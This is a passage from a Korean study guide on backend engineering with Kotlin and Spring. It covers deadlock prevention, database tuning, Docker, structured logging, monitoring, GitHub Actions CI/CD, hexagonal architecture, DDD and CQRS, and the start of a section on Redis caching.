-- 서로 대기 → 데드락 → InnoDB가 하나를 자동 롤백
```

**데드락 감지 로그:**
```
ERROR 1213 (40001): Deadlock found when trying to get lock;
try restarting transaction
```

**데드락 방지 전략:**

```kotlin
// 1. 락 획득 순서 일치 — 항상 ID 오름차순으로
@Transactional
fun transferBetweenAccounts(fromId: Long, toId: Long, amount: Int) {
    // 항상 작은 ID부터 락 획득 → 순환 대기 없음
    val (firstId, secondId) = if (fromId < toId) fromId to toId else toId to fromId
    val first = accountRepository.findByIdForUpdate(firstId)
    val second = accountRepository.findByIdForUpdate(secondId)
    // ...
}

// 2. 트랜잭션을 짧게 — 락 보유 시간 최소화
@Transactional
fun processOrder(orderId: Long) {
    // DB 작업만, I/O(HTTP 호출 등) 절대 금지
    val order = orderRepository.findByIdForUpdate(orderId)
    order.confirm()
    // externalApiCall() ← 절대 안 됨! 트랜잭션 내 외부 호출
}

// 3. Optimistic Lock — 충돌이 드물 때 (락 대신 버전 비교)
@Entity
class Order(
    var status: OrderStatus,
    @Version val version: Long = 0,
)

// 4. SELECT FOR UPDATE 범위 최소화
// 나쁜 예: 필요없는 행까지 잠금
@Query("SELECT o FROM Order o WHERE o.userId = :userId FOR UPDATE")
fun findAllByUserIdForUpdate(userId: Long): List<Order>

// 좋은 예: 딱 필요한 한 행만
@Query("SELECT o FROM Order o WHERE o.id = :id FOR UPDATE")
fun findByIdForUpdate(id: Long): Order?
```

**Lock 대기 타임아웃 설정:**
```yaml
# application.yml
spring:
  jpa:
    properties:
      javax.persistence.lock.timeout: 3000   # 3초 후 LockTimeoutException
```

---

### 5-E. 실전 DB 성능 튜닝 패턴

**느린 쿼리 찾기 (Slow Query Log):**

```sql
-- MariaDB/MySQL slow query log 활성화
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 1;    -- 1초 이상 걸리는 쿼리 기록
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- 로그 분석
-- tail -f /var/log/mysql/slow.log
-- mysqldumpslow -t 10 /var/log/mysql/slow.log  ← 상위 10개 슬로우 쿼리
```

**페이지네이션 성능 문제:**

```sql
-- 문제: OFFSET이 크면 OFFSET만큼 스킵하면서 읽어야 함
-- 10,000,000 건에서 마지막 페이지: 990만 건 읽고 버림
SELECT * FROM orders ORDER BY id DESC LIMIT 20 OFFSET 9900000;

-- 해결: Cursor-based Pagination (No-Offset)
-- 마지막으로 받은 id를 커서로 사용
SELECT * FROM orders
WHERE id < :lastId          -- 마지막 id보다 작은 것부터
ORDER BY id DESC
LIMIT 20;
-- → OFFSET 없이 항상 20건만 스캔
```

**Kotlin + Spring Data에서 Cursor Pagination:**

```kotlin
// Repository
interface OrderRepository : JpaRepository<Order, Long> {
    fun findTop20ByUserIdAndIdLessThanOrderByIdDesc(
        userId: Long,
        lastId: Long,
    ): List<Order>
}

// Service
fun getOrders(userId: Long, lastId: Long?): CursorPage<OrderDto> {
    val orders = if (lastId == null) {
        orderRepository.findTop20ByUserIdOrderByIdDesc(userId)
    } else {
        orderRepository.findTop20ByUserIdAndIdLessThanOrderByIdDesc(userId, lastId)
    }
    return CursorPage(
        content = orders.map { it.toDto() },
        nextCursor = orders.lastOrNull()?.id,
        hasNext = orders.size == 20,
    )
}
```

**대량 데이터 처리 (Batch Insert):**

```kotlin
// 나쁜 예: N번 INSERT — 트랜잭션 오버헤드 N배
fun saveAll(items: List<Item>) {
    items.forEach { itemRepository.save(it) }   // N번 INSERT
}

// 좋은 예: Batch Insert — 한 번에 묶어서
// application.yml
// spring.jpa.properties.hibernate.jdbc.batch_size: 500
// spring.jpa.properties.hibernate.order_inserts: true

fun saveAll(items: List<Item>) {
    itemRepository.saveAll(items)   // batch_size만큼 묶어서 INSERT
}

// 또는 JDBC로 직접 (가장 빠름)
@Autowired lateinit var jdbcTemplate: JdbcTemplate

fun bulkInsert(items: List<Item>) {
    jdbcTemplate.batchUpdate(
        "INSERT INTO items (name, price) VALUES (?, ?)",
        items.map { arrayOf(it.name, it.price) }
    )
}
```

**DB 연결 문제 진단:**

```kotlin
// HikariCP 상태 확인 (Actuator 통해)
// GET /actuator/metrics/hikaricp.connections.active
// GET /actuator/metrics/hikaricp.connections.pending   ← 대기 중인 요청

// Connection Pool 고갈 증상:
// HikariPool-1 - Connection is not available, request timed out after 30000ms
// → maximum-pool-size 증가 또는 쿼리 최적화로 커넥션 점유 시간 감소
```

---

## Phase 6: 운영/인프라

> 코드가 배포되고 나서부터가 진짜다.  
> 운영 환경에서 서비스를 올리고, 문제를 감지하고, 원인을 추적하는 능력이 시니어의 영역이다.

### 6-A. Docker

**왜 Docker인가:**
- "내 PC에서는 됩니다" 문제 해결 — 실행 환경을 코드로 관리
- 로컬 개발 환경(DB, Redis 등)을 팀 전체가 동일하게 유지
- 배포 단위가 JAR이 아닌 이미지 → 롤백이 이미지 교체로 단순해짐

**Spring Boot Dockerfile (멀티스테이지 빌드):**

```dockerfile
# ── Stage 1: 빌드 ─────────────────────────────────────
FROM eclipse-temurin:21-jdk AS builder
WORKDIR /app

# 의존성 캐시 활용: 소스 변경 시 의존성 재다운로드 방지
COPY gradlew build.gradle.kts settings.gradle.kts ./
COPY gradle ./gradle
RUN ./gradlew dependencies --no-daemon

# 소스 복사 및 빌드
COPY src ./src
RUN ./gradlew bootJar --no-daemon -x test

# ── Stage 2: 실행 ─────────────────────────────────────
# JRE만 포함 (JDK 불필요) → 이미지 크기 절반 이하
FROM eclipse-temurin:21-jre
WORKDIR /app

RUN addgroup --system app && adduser --system --group app
USER app

COPY --from=builder /app/build/libs/*.jar app.jar

# JVM 메모리 설정: 컨테이너 메모리 한도를 JVM이 인식하도록
ENV JAVA_OPTS="-XX:+UseContainerSupport -XX:MaxRAMPercentage=75.0"

EXPOSE 8080
ENTRYPOINT ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]
```

**.dockerignore:**
```
.gradle/
build/
.git/
*.md
src/test/
```

**docker-compose.yml — 로컬 개발 환경:**

```yaml
services:
  app:
    build: .
    ports:
      - "8080:8080"
    environment:
      DB_HOST: db
      DB_NAME: myapp
      DB_USER: app
      DB_PASSWORD: password
      JWT_SECRET: local-dev-secret-change-in-prod
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_started

  db:
    image: mariadb:10.11
    environment:
      MARIADB_DATABASE: myapp
      MARIADB_USER: app
      MARIADB_PASSWORD: password
      MARIADB_ROOT_PASSWORD: root
    ports:
      - "3306:3306"
    volumes:
      - db_data:/var/lib/mysql   # 컨테이너 재시작해도 데이터 유지
    healthcheck:
      test: ["CMD", "healthcheck.sh", "--connect"]
      interval: 5s
      timeout: 3s
      retries: 10

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  db_data:
```

**주요 Docker 명령어:**

```bash
# 이미지 빌드
docker build -t myapp:latest .

# 컨테이너 실행
docker run -p 8080:8080 -e JWT_SECRET=secret myapp:latest

# docker-compose
docker compose up -d          # 백그라운드 실행
docker compose down           # 중지 및 컨테이너 제거
docker compose down -v        # 볼륨까지 제거 (DB 초기화)
docker compose logs -f app    # 로그 스트리밍

# 실행 중인 컨테이너에 접속
docker exec -it <container_id> bash
```

---

### 6-B. 구조화 로깅

**로그 레벨 전략:**

| 레벨 | 용도 | 예시 |
|---|---|---|
| `ERROR` | 즉시 알림이 필요한 장애 | DB 연결 실패, 예상치 못한 예외 |
| `WARN` | 비정상이지만 서비스 계속 가능 | 비즈니스 예외, 재시도 발생 |
| `INFO` | 중요 이벤트 (운영 추적용) | 요청 처리 완료, 상태 전이 |
| `DEBUG` | 개발/디버깅용 (프로덕션 OFF) | 쿼리 파라미터, 중간 계산값 |
| `TRACE` | 매우 상세 (거의 사용 안 함) | 메서드 진입/종료 |

```kotlin
// 올바른 로그 작성 패턴
class OrderService {
    private val log = LoggerFactory.getLogger(this::class.java)

    fun placeOrder(request: OrderRequest): OrderDto {
        log.info("주문 생성 시작: userId={}, productId={}", request.userId, request.productId)

        return try {
            val order = processOrder(request)
            log.info("주문 생성 완료: orderId={}", order.id)
            order.toDto()
        } catch (e: ApiException) {
            log.warn("주문 생성 실패: errorCode={}, userId={}", e.errorCode, request.userId)
            throw e
        } catch (e: Exception) {
            // 스택 트레이스는 ERROR에서만
            log.error("주문 처리 중 예상치 못한 오류: userId={}", request.userId, e)
            throw e
        }
    }
}
```

**MDC (Mapped Diagnostic Context) — 요청 추적:**

```kotlin
// Filter에서 요청마다 고유 ID 부여
@Component
class MdcFilter : OncePerRequestFilter() {
    override fun doFilterInternal(
        request: HttpServletRequest,
        response: HttpServletResponse,
        chain: FilterChain,
    ) {
        val requestId = request.getHeader("X-Request-ID")
            ?: UUID.randomUUID().toString().take(8)
        val userId = (SecurityContextHolder.getContext().authentication
            ?.principal as? User)?.id?.toString() ?: "anonymous"

        MDC.put("requestId", requestId)
        MDC.put("userId", userId)
        MDC.put("uri", request.requestURI)
        response.setHeader("X-Request-ID", requestId)

        try {
            chain.doFilter(request, response)
        } finally {
            MDC.clear()   // 스레드풀 재사용 시 오염 방지
        }
    }
}
```

**Logback 설정 (logback-spring.xml):**

```xml
<configuration>
    <!-- 로컬/개발: 읽기 쉬운 텍스트 포맷 -->
    <springProfile name="local,dev">
        <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
            <encoder>
                <pattern>
                    %d{HH:mm:ss.SSS} [%thread] %-5level [%X{requestId}] [%X{userId}] %logger{36} - %msg%n
                </pattern>
            </encoder>
        </appender>
        <root level="DEBUG">
            <appender-ref ref="CONSOLE"/>
        </root>
    </springProfile>

    <!-- 프로덕션: JSON 포맷 (로그 수집 시스템 파싱 용이) -->
    <springProfile name="prod">
        <appender name="JSON_CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
            <encoder class="net.logstash.logback.encoder.LogstashEncoder">
                <includeMdcKeyName>requestId</includeMdcKeyName>
                <includeMdcKeyName>userId</includeMdcKeyName>
                <includeMdcKeyName>uri</includeMdcKeyName>
            </encoder>
        </appender>
        <root level="INFO">
            <appender-ref ref="JSON_CONSOLE"/>
        </root>
        <!-- 외부 라이브러리 로그는 WARN 이상만 -->
        <logger name="org.hibernate" level="WARN"/>
        <logger name="org.springframework" level="WARN"/>
    </springProfile>
</configuration>
```

**프로덕션 JSON 로그 출력 예시:**
```json
{
  "timestamp": "2024-07-15T14:23:01.123Z",
  "level": "INFO",
  "logger": "kr.socar.OrderService",
  "message": "주문 생성 완료: orderId=12345",
  "requestId": "a1b2c3d4",
  "userId": "987",
  "uri": "/v1/orders"
}
```

**로그 작성 원칙:**
- 민감 정보(비밀번호, 카드번호, 토큰) 절대 로그 금지
- `+ 연산`으로 로그 문자열 만들지 말 것 — `{}` 플레이스홀더 사용 (레벨 체크 후 포맷팅)
- 로그만 보고 무슨 일이 일어났는지 재현 가능해야 함

---

### 6-C. 모니터링

**모니터링 스택:**
```
Spring Actuator → Prometheus (수집) → Grafana (시각화) → AlertManager (알림)
```

**Spring Actuator 설정:**

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, info, metrics, prometheus
      base-path: /actuator
  endpoint:
    health:
      show-details: when-authorized
      probes:
        enabled: true     # /actuator/health/liveness, /actuator/health/readiness
  metrics:
    tags:
      application: ${spring.application.name}   # 메트릭에 앱 이름 태그
```

**핵심 모니터링 지표:**

```
# JVM
jvm.memory.used{area="heap"}              → 힙 사용량
jvm.gc.pause                              → GC 일시 정지 시간
jvm.threads.live                          → 활성 스레드 수

# HTTP
http.server.requests{uri="/v1/orders"}    → API 응답 시간 (p99 주시)
http.server.requests{status="500"}        → 5xx 에러율

# DB Connection Pool
hikaricp.connections.active               → 사용 중인 커넥션
hikaricp.connections.pending              → 대기 중인 요청 (0이어야 정상)
hikaricp.connections.timeout              → 커넥션 획득 타임아웃 횟수

# 비즈니스 커스텀 메트릭
orders.created.total                      → 주문 생성 수
orders.failed.total                       → 주문 실패 수
```

**커스텀 메트릭 등록:**

```kotlin
@Component
class OrderMetrics(private val meterRegistry: MeterRegistry) {

    private val ordersCreated = Counter.builder("orders.created.total")
        .description("총 주문 생성 수")
        .register(meterRegistry)

    private val orderProcessingTime = Timer.builder("orders.processing.time")
        .description("주문 처리 시간")
        .register(meterRegistry)

    fun recordOrderCreated() = ordersCreated.increment()

    fun <T> recordProcessingTime(block: () -> T): T =
        orderProcessingTime.recordCallable(block)!!
}

// Service에서 사용
@Service
class OrderService(
    private val orderMetrics: OrderMetrics,
) {
    fun placeOrder(request: OrderRequest): OrderDto =
        orderMetrics.recordProcessingTime {
            val order = processOrder(request)
            orderMetrics.recordOrderCreated()
            order.toDto()
        }
}
```

**Grafana 대시보드 핵심 패널:**
```
1. Request Rate (초당 요청 수): rate(http_server_requests_seconds_count[1m])
2. Error Rate (5xx 비율): rate(http_server_requests_seconds_count{status=~"5.."}[1m])
3. P99 Latency: histogram_quantile(0.99, rate(http_server_requests_seconds_bucket[5m]))
4. Heap Usage: jvm_memory_used_bytes{area="heap"}
5. Active DB Connections: hikaricp_connections_active
```

**알림 기준 (Alert 설정):**

| 지표 | 경고 기준 | 심각 기준 |
|---|---|---|
| 에러율 | 1% 이상 | 5% 이상 |
| P99 응답시간 | 1초 이상 | 3초 이상 |
| 힙 사용량 | 80% 이상 | 90% 이상 |
| DB 커넥션 대기 | 1 이상 | 5 이상 |

---

### 6-D. GitHub Actions CI/CD

**기본 파이프라인 구조:**

```yaml
# .github/workflows/ci.yml
name: CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
          cache: 'gradle'

      - name: Run tests
        run: ./gradlew test --no-daemon
        env:
          SPRING_PROFILES_ACTIVE: test

      - name: Upload test report
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: build/reports/tests/

  build-and-push:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Login to registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Push image
        run: |
          docker tag myapp:${{ github.sha }} ghcr.io/${{ github.repository }}:${{ github.sha }}
          docker tag myapp:${{ github.sha }} ghcr.io/${{ github.repository }}:latest
          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}
          docker push ghcr.io/${{ github.repository }}:latest
```

**GitHub Secrets 관리:**
```yaml
# 절대 코드에 하드코딩하지 않는 값들
secrets:
  JWT_SECRET: ${{ secrets.JWT_SECRET }}
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
  SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
```

**배포 전략:**

| 전략 | 설명 | 다운타임 |
|---|---|---|
| Rolling | 인스턴스를 순차적으로 교체 | 없음 (트래픽 유지) |
| Blue/Green | 동일 환경 두 벌, 트래픽 전환 | 없음 (즉각 롤백 가능) |
| Canary | 일부 트래픽만 새 버전으로 | 없음 (위험 최소화) |

---

## Phase 7: 아키텍처

> 기능은 동작하는데 코드베이스가 점점 복잡해진다면, 아키텍처가 문제다.  
> 좋은 아키텍처는 변경 비용을 낮게 유지한다.

### 7-A. Layered Architecture와 그 한계

**전통적 4계층:**

```
Presentation Layer   (Controller)
       ↓
Application Layer    (Service)
       ↓
Domain Layer         (Entity, Repository Interface)
       ↓
Infrastructure Layer (JPA Repository 구현체, 외부 API)
```

**현실의 문제 — Domain이 Infrastructure에 오염된다:**

```kotlin
// ❌ 전형적인 문제 패턴: Domain 객체가 JPA 어노테이션 투성이
@Entity                           // 인프라 관심사
@Table(name = "orders")           // 인프라 관심사
class Order(
    @Id @GeneratedValue           // 인프라 관심사
    val id: Long = 0,

    @ManyToOne(fetch = FetchType.LAZY)  // 인프라 관심사
    val user: User,

    var status: OrderStatus,      // 도메인 관심사 ← 이것만 순수 도메인

    @CreationTimestamp             // 인프라 관심사
    val createdAt: LocalDateTime = LocalDateTime.now(),
) {
    // 도메인 로직이 JPA 어노테이션에 파묻혀 있음
    fun confirm() {
        check(status == OrderStatus.PENDING) { "대기 중인 주문만 확정 가능" }
        status = OrderStatus.CONFIRMED
    }
}
```

**무엇이 문제인가:**
1. Order 도메인 객체를 테스트하려면 JPA 컨텍스트 필요
2. DB 스키마 변경이 도메인 로직에 영향
3. Order를 다른 저장소(Redis, MongoDB)로 바꾸면 도메인 코드도 수정해야 함
4. 의존성 방향: Domain → Infrastructure (역전이 필요)

---

### 7-B. Hexagonal Architecture (Ports & Adapters)

**핵심 아이디어: 의존성 방향을 도메인 쪽으로 역전**

```
            ┌─────────────────────────────────┐
            │           Application           │
            │                                 │
[Web]   ──→ │  Inbound    ┌──────────┐        │
[CLI]   ──→ │  Port       │  Domain  │  Outbound Port  ──→ [DB]
[Event] ──→ │  (Interface)│  (Pure)  │  (Interface)    ──→ [API]
            │             └──────────┘        │          ──→ [MQ]
            └─────────────────────────────────┘
                Adapter       Core         Adapter
             (구현체, 외부)  (순수 도메인)  (구현체, 외부)
```

**도메인이 외부를 모른다** — 도메인은 인터페이스(Port)만 알고, 구현체(Adapter)는 모른다.

**패키지 구조:**

```
src/main/kotlin/kr/socar/order/
├── domain/                     ← 순수 도메인 (의존성 없음)
│   ├── Order.kt                  도메인 객체
│   ├── OrderStatus.kt
│   └── OrderRepository.kt       Outbound Port (인터페이스)
│
├── application/                ← 유스케이스 조합
│   ├── port/
│   │   ├── in/
│   │   │   └── PlaceOrderUseCase.kt    Inbound Port (인터페이스)
│   │   └── out/
│   │       └── OrderRepository.kt     (domain에 정의해도 됨)
│   └── service/
│       └── OrderService.kt     Inbound Port 구현체
│
└── adapter/
    ├── in/
    │   └── web/
    │       └── OrderController.kt   Controller → Inbound Port 호출
    └── out/
        └── persistence/
            ├── OrderJpaRepository.kt
            ├── OrderPersistenceAdapter.kt  Outbound Port 구현체
            └── OrderJpaEntity.kt           JPA Entity (도메인 객체와 분리!)
```

**실제 코드 예시:**

```kotlin
// ── Domain (순수, JPA 어노테이션 없음) ────────────────────
data class Order(
    val id: Long = 0,
    val userId: Long,
    val productId: Long,
    var status: OrderStatus = OrderStatus.PENDING,
) {
    fun confirm() {
        check(status == OrderStatus.PENDING) { "대기 중인 주문만 확정 가능" }
        status = OrderStatus.CONFIRMED
    }

    fun cancel() {
        check(status != OrderStatus.COMPLETED) { "완료된 주문은 취소 불가" }
        status = OrderStatus.CANCELLED
    }
}

// Outbound Port — 도메인이 정의, 인프라가 구현
interface OrderRepository {
    fun save(order: Order): Order
    fun findById(id: Long): Order?
    fun findAllByUserId(userId: Long): List<Order>
}

// ── Application ──────────────────────────────────────────
// Inbound Port
interface PlaceOrderUseCase {
    fun place(command: PlaceOrderCommand): OrderResult
}

data class PlaceOrderCommand(val userId: Long, val productId: Long)
data class OrderResult(val orderId: Long, val status: OrderStatus)

// Inbound Port 구현 (= Application Service)
@Service
@Transactional
class OrderService(
    private val orderRepository: OrderRepository,   // 인터페이스만 알고 있음
    private val inventoryPort: InventoryPort,
) : PlaceOrderUseCase {

    override fun place(command: PlaceOrderCommand): OrderResult {
        inventoryPort.decreaseStock(command.productId, 1)
        val order = Order(userId = command.userId, productId = command.productId)
        val saved = orderRepository.save(order)
        return OrderResult(saved.id, saved.status)
    }
}

// ── Adapter (Outbound) ────────────────────────────────────
@Entity
@Table(name = "orders")
class OrderJpaEntity(          // JPA Entity는 도메인 객체와 완전히 분리
    @Id @GeneratedValue
    var id: Long = 0,
    val userId: Long,
    val productId: Long,
    @Enumerated(EnumType.STRING)
    var status: OrderStatus = OrderStatus.PENDING,
) {
    fun toDomain(): Order = Order(id, userId, productId, status)

    companion object {
        fun fromDomain(order: Order) = OrderJpaEntity(
            id = order.id,
            userId = order.userId,
            productId = order.productId,
            status = order.status,
        )
    }
}

@Component
class OrderPersistenceAdapter(
    private val jpaRepository: OrderJpaRepository,
) : OrderRepository {   // Outbound Port 구현

    override fun save(order: Order): Order =
        jpaRepository.save(OrderJpaEntity.fromDomain(order)).toDomain()

    override fun findById(id: Long): Order? =
        jpaRepository.findByIdOrNull(id)?.toDomain()

    override fun findAllByUserId(userId: Long): List<Order> =
        jpaRepository.findAllByUserId(userId).map { it.toDomain() }
}

// ── Adapter (Inbound) ─────────────────────────────────────
@RestController
class OrderController(
    private val placeOrderUseCase: PlaceOrderUseCase,   // 인터페이스만 알고 있음
) {
    @PostMapping("/v1/orders")
    @ResponseStatus(HttpStatus.CREATED)
    fun placeOrder(@Valid @RequestBody request: PlaceOrderRequest): OrderResponse =
        placeOrderUseCase.place(request.toCommand()).toResponse()
}
```

**언제 Hexagonal을 쓰는가:**

| 상황 | 권장 |
|---|---|
| 도메인 로직이 복잡하고 자주 변경됨 | Hexagonal |
| 저장소를 교체할 가능성이 있음 | Hexagonal |
| 도메인 단위 테스트가 중요함 | Hexagonal |
| 단순 CRUD, 빠른 프로토타입 | Layered 로도 충분 |
| 팀이 작고(1~2명) 복잡도가 낮음 | Layered 로도 충분 |

> **트레이드오프:** Hexagonal은 파일이 많아지고 매핑 코드(Domain ↔ JPA Entity)가 생긴다.  
> 복잡도를 통제하기 위해 복잡도를 추가하는 것 — 도메인이 복잡할 때만 효과가 있다.

---

### 7-C. DDD (Domain-Driven Design) 기초

**핵심 개념:**

```kotlin
// ── Entity: 식별자(ID)로 동등성 판단 ─────────────────────
class Order(
    val id: Long,           // ID가 같으면 같은 Order
    val userId: Long,
    var status: OrderStatus,
) {
    // 도메인 로직은 Entity 안에
    fun confirm() { ... }
    fun cancel() { ... }
}

// ── Value Object: 값으로 동등성 판단, 불변 ─────────────────
data class Money(val amount: Int, val currency: String) {
    init { require(amount >= 0) { "금액은 0 이상" } }

    operator fun plus(other: Money): Money {
        require(currency == other.currency) { "통화 단위 불일치" }
        return Money(amount + other.amount, currency)
    }
    // id 없음, amount + currency가 같으면 동일한 Money
}

data class Address(val zip: String, val base: String, val detail: String)
```

**Aggregate — 일관성 경계:**

```kotlin
// Aggregate Root: 외부에서 직접 접근 가능한 유일한 진입점
class Cart(
    val id: Long,
    val userId: Long,
    private val items: MutableList<CartItem> = mutableListOf(),
) {
    // CartItem은 Cart를 통해서만 추가/삭제 가능 (직접 접근 금지)
    fun addItem(productId: Long, quantity: Int) {
        val existing = items.find { it.productId == productId }
        if (existing != null) {
            existing.increaseQuantity(quantity)
        } else {
            items.add(CartItem(productId = productId, quantity = quantity))
        }
    }

    fun removeItem(productId: Long) {
        items.removeIf { it.productId == productId }
    }

    fun totalAmount(): Money =
        items.fold(Money(0, "KRW")) { acc, item -> acc + item.subtotal() }

    // 외부에 불변 뷰만 노출
    fun getItems(): List<CartItem> = items.toList()
}

// CartItem은 Cart Aggregate 내부 객체 — Cart 없이 독립적으로 존재 불가
class CartItem(
    val productId: Long,
    var quantity: Int,
    val unitPrice: Money = Money(0, "KRW"),
) {
    fun increaseQuantity(amount: Int) {
        require(amount > 0)
        quantity += amount
    }

    fun subtotal(): Money = Money(unitPrice.amount * quantity, unitPrice.currency)
}
```

**Domain Service — 여러 Aggregate에 걸친 로직:**

```kotlin
// 단일 Entity에 속하지 않는 도메인 로직
class TransferDomainService {
    fun transfer(from: Account, to: Account, amount: Money) {
        require(from.balance >= amount) { "잔액 부족" }
        from.withdraw(amount)
        to.deposit(amount)
        // 두 Account Aggregate에 걸친 로직 → Domain Service
    }
}

// Application Service와 차이:
// Domain Service = 순수 도메인 로직, 인프라 의존 없음
// Application Service = 유스케이스 조합, 트랜잭션/보안 등 인프라 관심사 포함
```

**Bounded Context — 같은 단어가 다른 의미:**

```
주문 컨텍스트의 "User": userId, 주문 이력
회원 컨텍스트의 "User": 이메일, 비밀번호, 프로필
결제 컨텍스트의 "User": 결제 수단, 청구 주소

→ 각 컨텍스트가 독자적인 User 정의 보유
→ 컨텍스트 간 통신은 이벤트 또는 명시적 매핑으로
```

---

### 7-D. CQRS (Command Query Responsibility Segregation)

**핵심 아이디어: 쓰기(Command)와 읽기(Query)를 분리**

**왜 분리하는가:**

```kotlin
// ❌ 문제: 복잡한 조회 로직이 도메인 Service에 섞임
@Service
class OrderService {
    fun placeOrder(command: PlaceOrderCommand): Order { ... }  // 쓰기
    fun cancelOrder(orderId: Long) { ... }                     // 쓰기

    // 복잡한 조회 — 여러 테이블 JOIN, DTO 변환, 페이지네이션
    fun getOrderListForAdmin(condition: SearchCondition, pageable: Pageable): Page<OrderAdminDto> {
        // 도메인 로직과 무관한 조회 코드가 Service를 오염시킴
    }
}
```

**CQRS 적용 후:**

```kotlin
// ── Command Side (쓰기) ────────────────────────────────────
// 도메인 모델 사용, 비즈니스 규칙 적용, 이벤트 발행
@Service
@Transactional
class OrderCommandService(
    private val orderRepository: OrderRepository,
) {
    fun placeOrder(command: PlaceOrderCommand): Long {
        val order = Order(userId = command.userId, productId = command.productId)
        return orderRepository.save(order).id
    }

    fun cancelOrder(orderId: Long) {
        val order = orderRepository.findById(orderId) ?: throw ApiException(ErrorCode.ORDER_NOT_FOUND)
        order.cancel()
    }
}

// ── Query Side (읽기) ──────────────────────────────────────
// 도메인 모델 없이 QueryDSL로 바로 DTO 조회 — 복잡한 JOIN도 자유롭게
@Service
@Transactional(readOnly = true)
class OrderQueryService(
    private val queryFactory: JPAQueryFactory,
) {
    private val order = QOrder.order
    private val user = QUser.user
    private val product = QProduct.product

    fun getOrdersForAdmin(condition: OrderSearchCondition, pageable: Pageable): Page<OrderAdminDto> =
        queryFactory
            .select(Projections.constructor(OrderAdminDto::class.java,
                order.id,
                user.name,
                product.title,
                order.status,
                order.createdAt,
            ))
            .from(order)
            .join(order.user, user)
            .join(order.product, product)
            .where(
                condition.status?.let { order.status.eq(it) },
                condition.userId?.let { order.userId.eq(it) },
            )
            .offset(pageable.offset)
            .limit(pageable.pageSize.toLong())
            .fetch()
            .let { content ->
                PageImpl(content, pageable, queryFactory
                    .select(order.count())
                    .from(order)
                    .fetchOne() ?: 0L)
            }
}

// ── Controller: Command/Query 서비스 각각 주입 ──────────────
@RestController
class OrderController(
    private val orderCommandService: OrderCommandService,
    private val orderQueryService: OrderQueryService,
) {
    @PostMapping("/v1/orders")
    @ResponseStatus(HttpStatus.CREATED)
    fun placeOrder(@Valid @RequestBody request: PlaceOrderRequest) =
        orderCommandService.placeOrder(request.toCommand())

    @GetMapping("/v1/admin/orders")
    fun getOrders(condition: OrderSearchCondition, pageable: Pageable) =
        orderQueryService.getOrdersForAdmin(condition, pageable)
}
```

**CQRS 적용 범위:**

| 수준 | 설명 | 언제 |
|---|---|---|
| **코드 분리** | Command/Query Service 클래스 분리 (DB는 동일) | 조회 로직이 복잡해질 때 (현재 단계) |
| **모델 분리** | Command용 도메인 모델 + Query용 Read Model 별도 | 도메인 복잡도 높을 때 |
| **저장소 분리** | Write DB(MySQL) + Read DB(복제본 또는 Elasticsearch) | 대규모 트래픽, 읽기 성능이 핵심일 때 |

> 처음부터 저장소 분리까지 갈 필요 없다.  
> 코드 분리 → 필요할 때 점진적으로 확장하는 게 현실적이다.

---

### 7-E. 아키텍처 선택 가이드

```
서비스 규모/복잡도에 따른 현실적 선택:

초기 스타트업 / 소규모 CRUD
→ Layered Architecture
→ JPA Entity = 도메인 객체 (매핑 비용 감수)
→ Service에 비즈니스 로직 집중

성장기 / 도메인 복잡도 증가
→ CQRS 도입 (Command/Query Service 분리)
→ 핵심 도메인에 DDD 기초 적용 (Value Object, Aggregate)

성숙기 / 팀 규모 확장
→ Hexagonal Architecture로 전환 (점진적)
→ Bounded Context 명확화
→ 도메인 이벤트 도입 고려
```

**현재 test-drive-portal-api의 위치:**
- Layered Architecture + QueryDSL 조회 분리 = CQRS 코드 분리 수준
- 다음 단계: 핵심 도메인(시승 예약, 상태 전이)에 DDD 적용 고려

---

## Phase 8: 성능

> 성능은 측정 없이 개선할 수 없다.  
> 추측으로 최적화하지 말고, 먼저 병목을 찾고 그 지점만 개선한다.

### 8-A. Redis 캐싱

**왜 캐싱인가:**

```
요청 → DB 조회 (수십~수백ms) → 응답
요청 → Redis 조회 (1~5ms)    → 응답  ← 캐시 히트 시 DB 부하 0

DB는 고비용 자원이다. 자주 읽히고 잘 안 바뀌는 데이터는 Redis에 올려놓는다.
```

**의존성 추가:**

```kotlin
// build.gradle.kts
implementation("org.springframework.boot:spring-boot-starter-data-redis")
implementation("org.springframework.boot:spring-boot-starter-cache")

// application.yml
spring:
  data:
    redis:
      host: ${REDIS_HOST:localhost}
      port: ${REDIS_PORT:6379}
  cache:
    type: redis
    redis:
      time-to-live: 300000   # 기본 TTL: 5분
```

**@Cacheable — 캐시에 없으면 실행, 있으면 캐시 반환:**

```kotlin
@Service
class ProductService(private val productRepository: ProductRepository) {

    // 캐시 키: "products::1", "products::2", ...
    @Cacheable(value = ["products"], key = "#id")
    fun findById(id: Long): ProductDto {
        log.info("DB 조회: productId={}", id)   // 캐시 히트 시 이 로그 안 찍힘
        return productRepository.findByIdOrNull(id)
            ?.toDto()
            ?: throw ApiException(ErrorCode.PRODUCT_NOT_FOUND)
    }

    // 조건부 캐싱: 결과가 null이 아닐 때만 캐시
    @Cacheable(value = ["products"], key = "#id", unless = "#result == null")
    fun findByIdOrNull(id: Long): ProductDto? = productRepository.findByIdOrNull(id)?.toDto()
}
```

**@CacheEvict — 데이터 변경 시 캐시 무효화:**

```kotlin
@Service
class ProductService {

    @CacheEvict(value = ["products"], key = "#id")
    fun updateProduct(id: Long, request: ProductUpdateRequest): ProductDto {
        val product = productRepository.findByIdOrNull(id)
